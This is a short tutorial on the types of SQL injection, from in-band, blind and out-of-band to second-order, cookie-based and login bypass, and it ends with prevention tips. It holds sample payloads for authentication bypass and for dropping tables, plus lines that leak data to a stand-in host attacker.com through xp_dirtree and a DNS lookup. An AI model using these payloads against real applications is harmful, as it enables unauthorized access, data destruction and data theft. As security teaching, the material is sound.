# Types of SQL Injections

SQL injection is a common web security vulnerability that allows attackers to interfere with the queries that an application makes to its database. Here are the main types of SQL injections:

---

## 1. **Classic SQL Injection (In-Band SQL Injection)**

### Definition:
This is the most common type of SQL injection, where the attacker uses the same communication channel to send malicious input and retrieve results.

### Examples:
- **Error-Based SQL Injection:** Exploits database errors to extract information.
  - Example: Using input like `' OR 1=1 --` to bypass authentication.
- **Union-Based SQL Injection:** Combines query results with a malicious query using the `UNION` operator.

---

## 2. **Blind SQL Injection**

### Definition:
Occurs when the application does not return database errors or results to the attacker but still alters the behavior of the application.

### Types:
1. **Boolean-Based Blind SQL Injection:** Relies on observing application behavior or responses based on true/false conditions.
   - Example: Testing with input like `1' AND 1=1 --` (true condition) vs. `1' AND 1=2 --` (false condition).
2. **Time-Based Blind SQL Injection:** Exploits database delays to infer information.
   - Example: `1' AND IF(1=1, SLEEP(5), 0) --` will delay the response if true.

---

## 3. **Out-of-Band SQL Injection**

### Definition:
This type of attack uses a different communication channel (like DNS or HTTP requests) to extract data from the database.

### Example:
- Exploiting input like:
  ```sql
  1'; EXEC xp_dirtree('//attacker.com/payload') --
  ```
  Here, the malicious payload sends data to an attacker-controlled server.

---

## 4. **Second-Order SQL Injection**

### Definition:
This occurs when malicious input is stored in the database and executed later in another context.

### Example:
- An attacker inserts malicious data during registration:
  ```sql
  '); DROP TABLE users; --
  ```
- When the stored data is retrieved and executed in another query, it causes harm.

---

## 5. **DNS-Based SQL Injection**

### Definition:
A variation of out-of-band injection where the attacker exploits the database's ability to perform DNS lookups to leak data.

### Example:
```sql
1'; SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com')) --
```

---

## 6. **Cookie-Based SQL Injection**

### Definition:
Exploits malicious payloads inserted into cookies, which are then parsed by the server.

### Example:
- Setting a cookie value like:
  ```sql
  id=1; DROP TABLE sessions; --
  ```

---

## 7. **Login/Authentication Bypass**

### Definition:
Targets the login process to bypass authentication mechanisms using crafted input.

### Example:
- Inputting `admin' OR '1'='1` in a login form.

---

## Prevention Techniques

1. **Use Prepared Statements and Parameterized Queries.**
2. **Employ Stored Procedures.**
3. **Validate User Inputs.**
4. **Implement Web Application Firewalls (WAF).**
5. **Use Database Permissions and Roles.**

---

SQL injections can have severe consequences, including data leaks, unauthorized access, and complete database compromise. Awareness and implementation of robust security measures are essential to mitigate these risks.
